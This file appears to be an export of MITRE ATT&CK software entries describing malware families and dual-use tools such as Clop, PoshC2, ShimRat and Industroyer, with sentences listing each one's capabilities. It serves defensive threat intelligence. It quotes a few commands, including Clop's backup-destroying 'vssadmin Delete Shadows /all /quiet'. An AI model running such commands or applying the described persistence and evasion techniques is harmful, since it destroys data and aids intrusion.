{"text": " [Winnti for Windows](https://attack.mitre.org/software/S0141) is a Trojan that has been used by multiple groups to carry out intrusions in varied regions from at least 2010 to 2016. One of the groups using this malware is referred to by the same name, [Winnti Group](https://attack.mitre.org/groups/G0044); however, reporting indicates a second distinct group, [Axiom](https://attack.mitre.org/groups/G0001), also uses the malware. (Citation: Kaspersky Winnti April 2013) (Citation: Microsoft Winnti Jan 2017) (Citation: Novetta Winnti April 2015) The Linux variant is tracked separately under [Winnti for Linux](https://attack.mitre.org/software/S0430).(Citation: Chronicle Winnti for Linux May 2019)", "idx": "https://attack.mitre.org/software/S0141", "title": "Winnti for Windows", "entity": "Winnti for Windows", "entity_type": "software", "entity_context": ["A Winnti for Windows implant file was named ASPNET_FILTER.DLL, mimicking the legitimate ASP.NET ISAPI filter DLL with the same name.", "Winnti for Windows sets its DLL file as a new service in the Registry to establish persistence.", "The Winnti for Windows installer loads a DLL using rundll32."], "is_subtechnique": false}
{"text": " [PsExec](https://attack.mitre.org/software/S0029) is a free Microsoft tool that can be used to execute a program on another computer. It is used by IT administrators and attackers. (Citation: Russinovich Sysinternals) (Citation: SANS PsExec)", "idx": "https://attack.mitre.org/software/S0029", "title": "PsExec", "entity": "PsExec", "entity_type": "software", "entity_context": ["PsExec has the ability to remotely create accounts on target systems.", "PsExec can leverage Windows services to escalate privileges from administrator to SYSTEM with the <code>-s</code> argument.", "PsExec can be used to download or upload a file over a network share.", "Microsoft Sysinternals PsExec is a popular administration tool that can be used to execute binaries on remote systems using a temporary Windows service.", "PsExec, a tool that has been used by adversaries, writes programs to the <code>ADMIN$</code> network share to execute commands on remote systems."], "is_subtechnique": false}
{"text": " [Clop](https://attack.mitre.org/software/S0611) is a ransomware family that was first observed in February 2019 and has been used against retail, transportation and logistics, education, manufacturing, engineering, automotive, energy, financial, aerospace, telecommunications, professional and legal services, healthcare, and high tech industries. [Clop](https://attack.mitre.org/software/S0611) is a variant of the CryptoMix ransomware.(Citation: Mcafee Clop Aug 2019)(Citation: Cybereason Clop Dec 2020)(Citation: Unit42 Clop April 2021)", "idx": "https://attack.mitre.org/software/S0611", "title": "Clop", "entity": "Clop", "entity_type": "software", "entity_context": ["Clop has searched folders and subfolders for files to encrypt.", "Clop can encrypt files using AES, RSA, and RC4 and will add the \".clop\" extension to encrypted files. ", "Clop can use cmd.exe to help execute commands on the system. ", "Clop has checked the keyboard language using the GetKeyboardLayout() function to avoid installation on Russian-language or other Commonwealth of Independent States-language machines; it will also check the <code>GetTextCharset</code> function. ", "Clop can enumerate network shares.", "Clop can delete the shadow volumes with <code>vssadmin Delete Shadows /all /quiet</code> and can use bcdedit to disable recovery options.", "Clop can uninstall or disable security products.", "Clop can enumerate all processes on the victim's machine.", "Clop has used a simple XOR operation to decrypt strings.", "Clop has used the <code>sleep</code> command to avoid sandbox detection.", "Clop can kill several processes and services related to backups and security solutions. ", "Clop can make modifications to Registry keys. ", "Clop can use msiexec.exe to disable security tools on the system. ", "Clop has used built-in API functions such as WNetOpenEnumW(), WNetEnumResourceW(), WNetCloseEnum(), GetProcAddress(), and VirtualAlloc().", "Clop can use code signing to evade detection.", "Clop has been packed to help avoid detection.", "Clop can search for processes with antivirus and antimalware product names."], "is_subtechnique": false}
{"text": " [PoshC2](https://attack.mitre.org/software/S0378) is an open source remote administration and post-exploitation framework that is publicly available on GitHub. The server-side components of the tool are primarily written in Python, while the implants are written in [PowerShell](https://attack.mitre.org/techniques/T1059/001). Although [PoshC2](https://attack.mitre.org/software/S0378) is primarily focused on Windows implantation, it does contain a basic Python dropper for Linux/macOS.(Citation: GitHub PoshC2)", "idx": "https://attack.mitre.org/software/S0378", "title": "PoshC2", "entity": "PoshC2", "entity_type": "software", "entity_context": ["PoshC2 has modules for enumerating domain trusts.", "PoshC2 can enumerate network adapter information.", "PoshC2 has modules for brute forcing local administrator and AD user accounts.", "PoshC2 has a number of modules that use WMI to execute tasks.", "PoshC2 contains an implementation of netstat to enumerate TCP and UDP connections.", "PoshC2 contains a module for recursively parsing through files and directories to gather valid credit card numbers.", "PoshC2 can use Invoke-RunAs to make tokens.", "PoshC2 can enumerate service and service permission information.", "PoshC2 can utilize multiple methods to bypass UAC.", "PoshC2 has modules for keystroke logging and capturing credentials from spoofed Outlook authentication messages.", "PoshC2 contains an implementation of PsExec for remote execution.", "PoshC2 can use protocols like HTTP/HTTPS for command and control traffic.", "PoshC2 contains a module for exploiting SMB via EternalBlue.", "PoshC2 contains a module for compressing data using ZIP.", "PoshC2 has a number of modules that leverage pass the hash for lateral movement.", "PoshC2 contains modules that allow for use of proxies in command and control.", "PoshC2 has the ability to persist on a system using WMI events.", "PoshC2 can use Inveigh to conduct name service poisoning for credential theft and associated relay attacks.", "PoshC2 can enumerate local and domain user account information.", "PoshC2 contains modules for searching for passwords in local and remote files.", "PoshC2 can use <code>Get-PassPol</code> to enumerate the domain password policy.", "PoshC2 contains modules for local privilege escalation exploits such as CVE-2016-9192 and CVE-2016-0099.", "PoshC2 can enumerate files on the local file system and includes a module for enumerating recently accessed files.", "PoshC2 contains a module for taking packet captures on compromised hosts.", "PoshC2 can perform port scans from an infected host.", "PoshC2 contains modules, such as <code>Get-ComputerInfo</code>, for enumerating common system information.", "PoshC2 can use Invoke-TokenManipulation for manipulating tokens.", "PoshC2 contains an implementation of Mimikatz to gather credentials from memory.", "PoshC2 contains multiple modules for injecting into processes, such as <code>Invoke-PSInject</code>.", "PoshC2 contains modules, such as <code>Get-LocAdm</code> for enumerating permission groups."], "is_subtechnique": false}
{"text": " [ShimRat](https://attack.mitre.org/software/S0444) has been used by the suspected China-based adversary [Mofang](https://attack.mitre.org/groups/G0103) in campaigns targeting multiple countries and sectors including government, military, critical infrastructure, automobile, and weapons development. The name \"[ShimRat](https://attack.mitre.org/software/S0444)\" comes from the malware's extensive use of Windows Application Shimming to maintain persistence. (Citation: FOX-IT May 2016 Mofang)", "idx": "https://attack.mitre.org/software/S0444", "title": "ShimRat", "entity": "ShimRat", "entity_type": "software", "entity_context": ["ShimRat communicated over HTTP and HTTPS with C2 servers.", "ShimRat has hijacked the cryptbase.dll within migwiz.exe to escalate privileges. This prevented the User Access Control window from appearing.", "ShimRat can enumerate connected drives for infected host machines.", "ShimRat has used a secondary C2 location if the first was unavailable.\t", "ShimRat can sleep when instructed to do so by the C2.\t", "ShimRat can be issued a command shell function from the C2.", "ShimRat's loader has been packed with the compressed ShimRat core DLL and the legitimate DLL for it to hijack.", "ShimRat can use pre-configured HTTP proxies.", "ShimRat can impersonate Windows services and antivirus products to avoid detection on compromised systems.", "ShimRat has decompressed its core DLL using shellcode once an impersonated antivirus component was running on a system.", "ShimRat can download additional files.", "ShimRat has used Windows API functions to install the service and shim.\t", "ShimRat has installed a Windows service to maintain persistence on victim machines.", "ShimRat can uninstall itself from compromised hosts, as well create and modify directories, delete, move, copy, and rename files.", "ShimRat can list directories.", "ShimRat has registered two registry keys for shim databases.", "ShimRat has installed a registry based start-up key <code>HKCU\\Software\\microsoft\\windows\\CurrentVersion\\Run</code> to maintain persistence should other methods fail.", "ShimRat has the capability to upload collected files to a C2.\t", "ShimRat has installed shim databases in the <code>AppPatch</code> folder.", "ShimRat has been delivered as a package that includes compressed DLL and shellcode payloads within a .dat file.", "ShimRat can hijack the cryptbase.dll within migwiz.exe to escalate privileges and bypass UAC controls."], "is_subtechnique": false}
{"text": " [XAgentOSX](https://attack.mitre.org/software/S0161) is a trojan that has been used by [APT28](https://attack.mitre.org/groups/G0007) on OS X and appears to be a port of their standard [CHOPSTICK](https://attack.mitre.org/software/S0023) or XAgent trojan. (Citation: XAgentOSX 2017)", "idx": "https://attack.mitre.org/software/S0161", "title": "XAgentOSX", "entity": "XAgentOSX", "entity_type": "software", "entity_context": ["XAgentOSX contains the getFirefoxPassword function to attempt to locate Firefox passwords.", "XAgentOSX contains the ftpUpload function to use the FTPManager:uploadFile method to upload files from the target system.", "XAgentOSX contains keylogging functionality that will monitor for active application windows and write them to the log, it can handle special characters, and it will buffer by default 50 characters before sending them out over the C2 infrastructure.", "XAgentOSX contains the getInstalledAPP function to run <code>ls -la /Applications</code> to gather what applications are installed.", "XAgentOSX contains the getProcessList function to run <code>ps aux</code> to get running processes.", "XAgentOSX contains the getInfoOSX function to return the OS X version as well as the current user.", "XAgentOSX contains the execFile function to execute a specified file on the system using the NSTask:launch method.", "XAgentOSX contains the readFiles function to return a detailed listing (sometimes recursive) of a specified directory. XAgentOSX contains the showBackupIosFolder function to check for IOS device backups by running <code>ls -la ~/Library/Application\\ Support/MobileSync/Backup/</code>.", "XAgentOSX contains the takeScreenShot (along with startTakeScreenShot and stopTakeScreenShot) functions to take screenshots using the CGGetActiveDisplayList, CGDisplayCreateImage, and NSImage:initWithCGImage methods.", "XAgentOSX contains the deletFileFromPath function to delete a specified file using the NSFileManager:removeFileAtPath method."], "is_subtechnique": false}
{"text": " [WellMail](https://attack.mitre.org/software/S0515) is a lightweight malware written in Golang used by [APT29](https://attack.mitre.org/groups/G0016), similar in design and structure to [WellMess](https://attack.mitre.org/software/S0514).(Citation: CISA WellMail July 2020)(Citation: NCSC APT29 July 2020)", "idx": "https://attack.mitre.org/software/S0515", "title": "WellMail", "entity": "WellMail", "entity_type": "software", "entity_context": ["WellMail has been observed using TCP port 25, without using SMTP, to leverage an open port for secure command and control communications.", "WellMail can identify the current username on the victim system.", "WellMail can decompress scripts received from C2.", "WellMail can archive files on the compromised host.", "WellMail can exfiltrate files from the victim machine.", "WellMail can use hard coded client and certificate authority certificates to communicate with C2 over mutual TLS.", "WellMail can identify the IP address of the victim system.", "WellMail can use TCP for C2 communications.", "WellMail can receive data and executable scripts from C2."], "is_subtechnique": false}
{"text": " [Miner-C](https://attack.mitre.org/software/S0133) is malware that mines victims for the Monero cryptocurrency. It has targeted FTP servers and Network Attached Storage (NAS) devices to spread. (Citation: Softpedia MinerC)", "idx": "https://attack.mitre.org/software/S0133", "title": "Miner-C", "entity": "Miner-C", "entity_type": "software", "entity_context": ["Miner-C copies itself into the public folder of Network Attached Storage (NAS) devices and infects new victims who open the file."], "is_subtechnique": false}
{"text": " [Kasidet](https://attack.mitre.org/software/S0088) is a backdoor that has been dropped by using malicious VBA macros. (Citation: Zscaler Kasidet)", "idx": "https://attack.mitre.org/software/S0088", "title": "Kasidet", "entity": "Kasidet", "entity_type": "software", "entity_context": ["Kasidet can execute commands using cmd.exe.", "Kasidet has the ability to obtain a victim's system name and operating system version.", "Kasidet has the ability to change firewall settings to allow a plug-in to be downloaded.", "Kasidet has the ability to initiate keylogging.", "Kasidet has the ability to search for a given process name in processes currently running in the system.", "Kasidet creates a Registry Run key to establish persistence.", "Kasidet has the ability to search for a given filename on a victim.", "Kasidet has the ability to initiate keylogging and screen captures.", "Kasidet has the ability to identify any anti-virus installed on the infected system.", "Kasidet has the ability to download and execute additional files."], "is_subtechnique": false}
{"text": " [BUBBLEWRAP](https://attack.mitre.org/software/S0043) is a full-featured, second-stage backdoor used by the [admin@338](https://attack.mitre.org/groups/G0018) group. It is set to run when the system boots and includes functionality to check, upload, and register plug-ins that can further enhance its capabilities. (Citation: FireEye admin@338)", "idx": "https://attack.mitre.org/software/S0043", "title": "BUBBLEWRAP", "entity": "BUBBLEWRAP", "entity_type": "software", "entity_context": ["BUBBLEWRAP can communicate using HTTP or HTTPS.", "BUBBLEWRAP collects system information, including the operating system version and hostname.", "BUBBLEWRAP can communicate using SOCKS."], "is_subtechnique": false}
{"text": " [ADVSTORESHELL](https://attack.mitre.org/software/S0045) is a spying backdoor that has been used by [APT28](https://attack.mitre.org/groups/G0007) from at least 2012 to 2016. It is generally used for long-term espionage and is deployed on targets deemed interesting after a reconnaissance phase. (Citation: Kaspersky Sofacy) (Citation: ESET Sednit Part 2)", "idx": "https://attack.mitre.org/software/S0045", "title": "ADVSTORESHELL", "entity": "ADVSTORESHELL", "entity_type": "software", "entity_context": ["ADVSTORESHELL compresses output data generated by command execution with a custom implementation of the Lempel–Ziv–Welch (LZW) algorithm.", "Some variants of ADVSTORESHELL achieve persistence by registering the payload as a Shell Icon Overlay handler COM object.", "ADVSTORESHELL can perform keylogging.", "ADVSTORESHELL can delete files and directories.", "Most of the strings in ADVSTORESHELL are encrypted with an XOR-based algorithm; some strings are also encrypted with 3DES and reversed. API function names are also reversed, presumably to avoid detection in memory.", "ADVSTORESHELL can list connected devices.", "ADVSTORESHELL collects, compresses, encrypts, and exfiltrates data to the C2 server every 10 minutes.", "ADVSTORESHELL is capable of setting and deleting Registry values.", "C2 traffic from ADVSTORESHELL is encrypted, then encoded with Base64 encoding.", "ADVSTORESHELL can list running processes.", "ADVSTORESHELL can run Systeminfo to gather information about the victim.", "ADVSTORESHELL can enumerate registry keys.", "ADVSTORESHELL can list files and directories.", "ADVSTORESHELL exfiltrates data over the same channel used for C2.", "A variant of ADVSTORESHELL encrypts some C2 with RSA.", "ADVSTORESHELL connects to port 80 of a C2 server using Wininet API. Data is exchanged via HTTP POSTs.", "ADVSTORESHELL can create a remote shell and run a given command.", "ADVSTORESHELL achieves persistence by adding itself to the <code>HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> Registry key.", "ADVSTORESHELL is capable of starting a process using CreateProcess.", "A variant of ADVSTORESHELL encrypts some C2 with 3DES.", "ADVSTORESHELL encrypts with the 3DES algorithm and a hardcoded key prior to exfiltration.", "ADVSTORESHELL has used rundll32.exe in a Registry value to establish persistence.", "ADVSTORESHELL stores output from command execution in a .dat file in the %TEMP% directory.", "A variant of ADVSTORESHELL attempts communication to the C2 server over HTTP on port 443."], "is_subtechnique": false}
{"text": " [SHOTPUT](https://attack.mitre.org/software/S0063) is a custom backdoor used by [APT3](https://attack.mitre.org/groups/G0022). (Citation: FireEye Clandestine Wolf)", "idx": "https://attack.mitre.org/software/S0063", "title": "SHOTPUT", "entity": "SHOTPUT", "entity_type": "software", "entity_context": ["SHOTPUT is obscured using XOR encoding and appended to a valid GIF file.", "SHOTPUT has a command to retrieve information about connected users.", "SHOTPUT has a command to obtain a directory listing.", "SHOTPUT uses netstat to list TCP connection status.", "SHOTPUT has a command to obtain a process listing.", "SHOTPUT has a command to list all servers in the domain, as well as one to locate domain controllers on a domain."], "is_subtechnique": false}
{"text": " [LoudMiner](https://attack.mitre.org/software/S0451) is a cryptocurrency miner which uses virtualization software to siphon system resources. The miner has been bundled with pirated copies of Virtual Studio Technology (VST) for Windows and macOS.(Citation: ESET LoudMiner June 2019)", "idx": "https://attack.mitre.org/software/S0451", "title": "LoudMiner", "entity": "LoudMiner", "entity_type": "software", "entity_context": ["LoudMiner has set the attributes of the VirtualBox directory and VBoxVmService parent directory to \"hidden\".", "LoudMiner deleted installation files after completion.", "LoudMiner has obfuscated various scripts and encrypted DMG files.\t", "LoudMiner used shell scripts to launch various services and to start/stop the QEMU virtualization.\t", "LoudMiner used a batch script to run the Linux virtual machine as a service.", "LoudMiner adds plist files with the naming format <code>com.random_name.plist</code> in the <code>/Library/LaunchDaemons</code> folder with the RunAtLoad and KeepAlive keys set to <code>true</code>.", "LoudMiner used SCP to update the miner from the C2.", "LoudMiner is typically bundled with pirated copies of Virtual Studio Technology (VST) for Windows and macOS.", "LoudMiner used an MSI installer to install the virtualization software.\t", "LoudMiner has used QEMU and VirtualBox to run a Tiny Core Linux virtual machine, which runs XMRig and makes connections to the C2 server for updates.", "LoudMiner used the <code>ps</code> command to monitor the running processes on the system.\t", "LoudMiner started the cryptomining virtual machine as a service on the infected machine.", "LoudMiner has monitored CPU usage.\t", "LoudMiner can automatically launch a Linux virtual machine as a service at startup if the AutoStart option is enabled in the VBoxVmService configuration file.", "LoudMiner used a script to gather the IP address of the infected machine before sending to the C2.", "LoudMiner launched the QEMU services in the <code>/Library/LaunchDaemons/</code> folder using <code>launchctl</code>. It also uses <code>launchctl</code> to unload all Launch Daemons when updating to a newer version of LoudMiner.\t", "LoudMiner harvested system resources to mine cryptocurrency, using XMRig to mine Monero.\t"], "is_subtechnique": false}
{"text": " [WastedLocker](https://attack.mitre.org/software/S0612) is a ransomware family attributed to [Indrik Spider](https://attack.mitre.org/groups/G0119) that has been used since at least May 2020. [WastedLocker](https://attack.mitre.org/software/S0612) has been used against a broad variety of sectors, including manufacturing, information technology, and media.(Citation: Symantec WastedLocker June 2020)(Citation: NCC Group WastedLocker June 2020)(Citation: Sentinel Labs WastedLocker July 2020)", "idx": "https://attack.mitre.org/software/S0612", "title": "WastedLocker", "entity": "WastedLocker", "entity_type": "software", "entity_context": ["WastedLocker can execute itself as a service.", "WastedLocker has the ability to save and execute files as an alternate data stream (ADS).", "WastedLocker can enumerate removable drives prior to the encryption process.", "WastedLocker's custom crypter, CryptOne, leveraged the VirtualAlloc() API function to help execute the payload.", "WastedLocker's custom cryptor, CryptOne, used an XOR based algorithm to decrypt the payload.", "WastedLocker can encrypt data and leave a ransom note. ", "WastedLocker can perform a UAC bypass if it is not executed with administrator rights or if the infected host runs Windows Vista or later.", "WastedLocker has copied a random file from the Windows System32 folder to the <code>%APPDATA%</code> location under a different hidden filename.", "WastedLocker has a command to take ownership of a file and reset the ACL permissions using the <code>takeown.exe /F filepath</code> command. ", "WastedLocker has used cmd to execute commands on the system.", "WastedLocker can modify registry values within the <code>Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap</code> registry key.", " WastedLocker has performed DLL hijacking before execution.", "WastedLocker checked if UCOMIEnumConnections and IActiveScriptParseProcedure32 Registry keys were detected as part of its anti-analysis technique.", "WastedLocker checks for specific registry keys related to the <code>UCOMIEnumConnections</code> and <code>IActiveScriptParseProcedure32</code> interfaces.", "WastedLocker can identify network adjacent and accessible drives.", "WastedLocker can delete shadow volumes. ", "WastedLocker can enumerate files and directories just prior to encryption.", "WastedLocker created and established a service that runs until the encryption process is complete. ", "The WastedLocker payload includes encrypted strings stored within the .bss section of the binary file.   ", "WastedLocker contains junk code to increase its entropy and hide the actual code."], "is_subtechnique": false}
{"text": " [FELIXROOT](https://attack.mitre.org/software/S0267) is a backdoor that has been used to target Ukrainian victims. (Citation: FireEye FELIXROOT July 2018)", "idx": "https://attack.mitre.org/software/S0267", "title": "FELIXROOT", "entity": "FELIXROOT", "entity_type": "software", "entity_context": ["FELIXROOT adds a shortcut file to the startup folder for persistence.", "FELIXROOT gathers the time zone information from the victim’s machine.", "FELIXROOT uses Port Numbers 443, 8443, and 8080 for C2 communications.", "FELIXROOT uses WMI to query the Windows Registry.", "FELIXROOT collects information about the network including the IP address and DHCP server.", "FELIXROOT executes batch scripts on the victim’s machine, and can launch a reverse shell for command execution.", "FELIXROOT uses HTTP and HTTPS to communicate with the C2 server.", "FELIXROOT collects a list of running processes.", "FELIXROOT queries the Registry for specific keys for potential privilege escalation and proxy information. FELIXROOT has also used WMI to query the Windows Registry.", "FELIXROOT encrypts strings in the backdoor using a custom XOR algorithm.", "FELIXROOT collects the username from the victim’s machine.", "FELIXROOT deletes the Registry key <code>HKCU\\Software\\Classes\\Applications\\rundll32.exe\\shell\\open</code>.", "FELIXROOT downloads and uploads files to and from the victim’s machine.", "FELIXROOT uses Rundll32 for executing the dropper program.", "FELIXROOT collects the victim’s computer name, processor architecture, OS version, volume serial number, and system type.", "FELIXROOT creates a .LNK file for persistence.", "FELIXROOT encrypts collected data with AES and Base64 and then sends it to the C2 server.", "FELIXROOT deletes the .LNK file from the startup directory as well as the dropper components.", "FELIXROOT checks for installed security software like antivirus and firewall."], "is_subtechnique": false}
{"text": " [China Chopper](https://attack.mitre.org/software/S0020) is a [Web Shell](https://attack.mitre.org/techniques/T1505/003) hosted on Web servers to provide access back into an enterprise network that does not rely on an infected system calling back to a remote command and control server. (Citation: Lee 2013) It has been used by several threat groups. (Citation: Dell TG-3390) (Citation: FireEye Periscope March 2018)(Citation: CISA AA21-200A APT40 July 2021)", "idx": "https://attack.mitre.org/software/S0020", "title": "China Chopper", "entity": "China Chopper", "entity_type": "software", "entity_context": ["China Chopper's server component can upload local files.", "China Chopper's server component can download remote files.", "China Chopper's client component is packed with UPX.", "China Chopper's server component can perform brute force password guessing against authentication portals.", "China Chopper's server component can change the timestamp of files.", "China Chopper's server component can list directory contents.", "China Chopper's server component is capable of opening a command terminal.", "China Chopper's server component can spider authentication portals.", "China Chopper's server component is a Web Shell payload.", "China Chopper's server component executes code sent via HTTP POST commands."], "is_subtechnique": false}
{"text": " [FLIPSIDE](https://attack.mitre.org/software/S0173) is a simple tool similar to Plink that is used by [FIN5](https://attack.mitre.org/groups/G0053) to maintain access to victims. (Citation: Mandiant FIN5 GrrCON Oct 2016)", "idx": "https://attack.mitre.org/software/S0173", "title": "FLIPSIDE", "entity": "FLIPSIDE", "entity_type": "software", "entity_context": ["FLIPSIDE uses RDP to tunnel traffic from a victim environment."], "is_subtechnique": false}
{"text": " [Remsec](https://attack.mitre.org/software/S0125) is a modular backdoor that has been used by [Strider](https://attack.mitre.org/groups/G0041) and appears to have been designed primarily for espionage purposes. Many of its modules are written in Lua. (Citation: Symantec Strider Blog)", "idx": "https://attack.mitre.org/software/S0125", "title": "Remsec", "entity": "Remsec", "entity_type": "software", "entity_context": ["Remsec can obtain the OS version information, computer name, processor architecture, machine role, and OS edition.", "Remsec contains a network loader to receive executable modules from remote attackers and run them on the local victim. It can also upload and download files over HTTP and HTTPS.", "Remsec can obtain information about the current user.", "Remsec is capable of using ICMP, TCP, and UDP for C2.", "Some data in Remsec is encrypted using RC5 in CBC mode, AES-CBC with a hardcoded key, RC4, or Salsa20. Some data is also base64-encoded.", "The Remsec loader implements itself with the name Security Support Provider, a legitimate Windows function. Various Remsec .exe files mimic legitimate file names used by Microsoft, Symantec, Kaspersky, Hewlett-Packard, and VMWare. Remsec also disguised malicious modules using similar filenames as custom network encryption software on victims.", "Remsec can exfiltrate data via a DNS tunnel or email, separately from its C2 channel.", "Remsec has a package that collects documents from any inserted USB sticks.", "Remsec can obtain information about network configuration, including the routing table, ARP cache, and DNS cache.", "Remsec can add or remove applications or ports on the Windows firewall or disable it entirely.", "Remsec has a plugin to detect active drivers of some security products.", "Remsec can ping or traceroute a remote host.", "Remsec is capable of using DNS for C2.", "Remsec harvests plain-text credentials as a password filter registered on domain controllers.", "Remsec can obtain a process list from the victim.", "Remsec can perform DLL injection.", "Remsec schedules the execution one of its modules by creating a new scheduler task.", "Remsec is capable of listing contents of folders on the victim. Remsec also searches for custom network encryption software on victims.", "Remsec can obtain a list of active connections and open ports.", "Remsec contains a keylogger component.", "Remsec contains a module to move data from airgapped networks to Internet-connected systems by using a removable USB device.", "Remsec is capable of deleting files on the victim. It also securely removes itself after collecting and exfiltrating data.", "Remsec can dump the SAM database.", "Remsec is capable of using SMTP for C2.", "Remsec is capable of using HTTP and HTTPS for C2.", "Remsec can obtain a list of users.", "Remsec has a plugin that can perform ARP scanning as well as port scanning.", "Remsec has a plugin to drop and execute vulnerable Outpost Sandbox or avast! Virtualization drivers in order to gain kernel mode privileges."], "is_subtechnique": false}
{"text": " [ShadowPad](https://attack.mitre.org/software/S0596) is a modular backdoor that was first identified in a supply chain compromise of the NetSarang software in mid-July 2017. The malware was originally thought to be exclusively used by [APT41](https://attack.mitre.org/groups/G0096), but has since been observed to be used by various Chinese threat activity groups. (Citation: Recorded Future RedEcho Feb 2021)(Citation: Securelist ShadowPad Aug 2017)(Citation: Kaspersky ShadowPad Aug 2017)", "idx": "https://attack.mitre.org/software/S0596", "title": "ShadowPad", "entity": "ShadowPad", "entity_type": "software", "entity_context": ["ShadowPad has encrypted a virtual file system and various files.", "ShadowPad has collected the domain name of the victim system.", "ShadowPad has collected the username of the victim system.", "ShadowPad has discovered system information including memory status, CPU frequency, OS versions, and volume serial numbers.", "ShadowPad has encoded data as readable Latin characters.", "ShadowPad has used DNS tunneling for C2 communications.", "ShadowPad has used FTP for C2 communications.", "ShadowPad has collected the PID of a malicious process.", "ShadowPad has downloaded code from a C2 server.", "ShadowPad has deleted arbitrary Registry values.", "ShadowPad has injected a DLL into svchost.exe.", "ShadowPad has used UDP for C2 communications.", "ShadowPad has injected an install module into a newly created process.", "ShadowPad has sent data back to C2 every 8 hours.", "ShadowPad uses a DGA that is based on the day of the month for C2 servers.", "ShadowPad has decrypted a binary blob to start execution.", "ShadowPad communicates over HTTP to retrieve a string that is decoded into a C2 server URL.", "ShadowPad has collected the current date and time of the victim system.", "ShadowPad maintains a configuration block and virtual file system in the Registry."], "is_subtechnique": false}
{"text": " [PowerShower](https://attack.mitre.org/software/S0441) is a PowerShell backdoor used by [Inception](https://attack.mitre.org/groups/G0100) for initial reconnaissance and to download and execute second stage payloads.(Citation: Unit 42 Inception November 2018)(Citation: Kaspersky Cloud Atlas August 2019)", "idx": "https://attack.mitre.org/software/S0441", "title": "PowerShower", "entity": "PowerShower", "entity_type": "software", "entity_context": ["PowerShower has the ability to identify the current Windows domain of the infected host.", "PowerShower has the ability to remove all files created during the dropper process.", "PowerShower sets up persistence with a Registry run key.", "PowerShower has used 7Zip to compress .txt, .pdf, .xls or .doc files prior to exfiltration.", "PowerShower has added a registry key so future powershell.exe instances are spawned with coordinates for a window position off-screen by default.", "PowerShower has used a PowerShell document stealer module to pack and exfiltrate .txt, .pdf, .xls or .doc files smaller than 5MB that were modified during the past two days.", "PowerShower has collected system information on the infected host.", "PowerShower has the ability to encode C2 communications with base64 encoding.", "PowerShower has sent HTTP GET and POST requests to C2 servers to send information and receive instructions.", "PowerShower has the ability to deploy a reconnaissance module to retrieve a list of the active processes.", "PowerShower has the ability to save and execute VBScript.", "PowerShower is a backdoor written in PowerShell.", "PowerShower has added a registry key so future powershell.exe instances are spawned off-screen by default, and has removed all registry entries that are left behind during the dropper process.", "PowerShower has the ability to identify the current user on the infected host."], "is_subtechnique": false}
{"text": " [Proton](https://attack.mitre.org/software/S0279) is a macOS backdoor focusing on data theft and credential access (Citation: objsee mac malware 2017).", "idx": "https://attack.mitre.org/software/S0279", "title": "Proton", "entity": "Proton", "entity_type": "software", "entity_context": ["Proton uses macOS' .command file type to script actions.", "Proton kills security tools like Wireshark that are running.", "Proton uses VNC to connect into systems.", "Proton captures the content of the desktop with the screencapture binary.", "Proton gathers credentials in files for keychains.", "Proton persists via Launch Agent.", "Proton gathers credentials in files for 1password.", "Proton uses an encrypted file to store commands and configuration values.", "Proton modifies the tty_tickets line in the sudoers file.", "Proton gathers credentials for Google Chrome.", "Proton uses a keylogger to capture keystrokes.", "Proton removes logs from <code>/var/logs</code> and <code>/Library/logs</code>.", "Proton removes all files in the /tmp directory.", "Proton prompts users for their credentials.", "Proton zips up files before exfiltrating them."], "is_subtechnique": false}
{"text": " [LightNeuron](https://attack.mitre.org/software/S0395) is a sophisticated backdoor that has targeted Microsoft Exchange servers since at least 2014. [LightNeuron](https://attack.mitre.org/software/S0395) has been used by [Turla](https://attack.mitre.org/groups/G0010) to target diplomatic and foreign affairs-related organizations. The presence of certain strings in the malware suggests a Linux variant of [LightNeuron](https://attack.mitre.org/software/S0395) exists.(Citation: ESET LightNeuron May 2019)", "idx": "https://attack.mitre.org/software/S0395", "title": "LightNeuron", "entity": "LightNeuron", "entity_type": "software", "entity_context": ["LightNeuron encrypts its configuration files with AES-256.", "LightNeuron collects Exchange emails matching rules specified in its configuration.", "LightNeuron uses SMTP for C2.", "LightNeuron gathers information about network adapters using the Win32 API call <code>GetAdaptersInfo</code>.", "LightNeuron can store email data in files and directories specified in its configuration, such as <code>C:\\Windows\\ServiceProfiles\\NetworkService\\appdata\\Local\\Temp\\</code>.", "LightNeuron contains a function to encrypt and store emails that it collects.", "LightNeuron has used AES and XOR to decrypt configuration files and commands.", "LightNeuron has the ability to download and execute additional files.", "LightNeuron is capable of executing commands via cmd.exe.", "LightNeuron has used a malicious Microsoft Exchange transport agent for persistence.", "LightNeuron can be configured to automatically collect files under a specified directory.", "LightNeuron exfiltrates data over its email C2 channel.", "LightNeuron can collect files from a local system.", "LightNeuron can be configured to automatically exfiltrate files under a specified directory.", "LightNeuron has used filenames associated with Exchange and Outlook for binary and configuration files, such as <code>winmail.dat</code>.", "LightNeuron can be configured to exfiltrate data during nighttime or working hours.", "LightNeuron is capable of starting a process using CreateProcess.", "LightNeuron is controlled via commands that are embedded into PDFs and JPGs using steganographic methods.", "LightNeuron gathers the victim computer name using the Win32 API call <code>GetComputerName</code>.", "LightNeuron is capable of modifying email content, headers, and attachments during transit.", "LightNeuron has a function to delete files.", "LightNeuron uses AES to encrypt C2 traffic."], "is_subtechnique": false}
{"text": " [Industroyer](https://attack.mitre.org/software/S0604) is a sophisticated malware framework designed to cause an impact to the working processes of Industrial Control Systems (ICS), specifically components used in electrical substations.(Citation: ESET Industroyer) [Industroyer](https://attack.mitre.org/software/S0604) was used in the attacks on the Ukrainian power grid in December 2016.(Citation: Dragos Crashoverride 2017) This is the first publicly known malware specifically designed to target and impact operations in the electric grid.(Citation: Dragos Crashoverride 2018)", "idx": "https://attack.mitre.org/software/S0604", "title": "Industroyer", "entity": "Industroyer", "entity_type": "software", "entity_context": ["Industroyer used Tor nodes for C2.", "Industroyer can enumerate remote computers in the compromised network.", "Industroyer has used a Trojanized version of the Windows Notepad application for an additional backdoor persistence mechanism.", "Industroyer sends information about hardware profiles and previously-received commands back to the C2 server in a POST-request.", "Industroyer uses heavily obfuscated code in its Windows Notepad backdoor.", "Industroyer downloads a shellcode payload from a remote C2 server and loads it into memory.", "Industroyer uses a custom port scanner to map out a network.", "Industroyer has a data wiper component that enumerates keys in the Registry <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services</code>.", "Industroyer decrypts code to connect to a remote C2 server.", "Industroyer’s main backdoor connected to a remote C2 server using HTTPS.", "Industroyer uses a custom DoS tool that leverages CVE-2015-5374 and targets 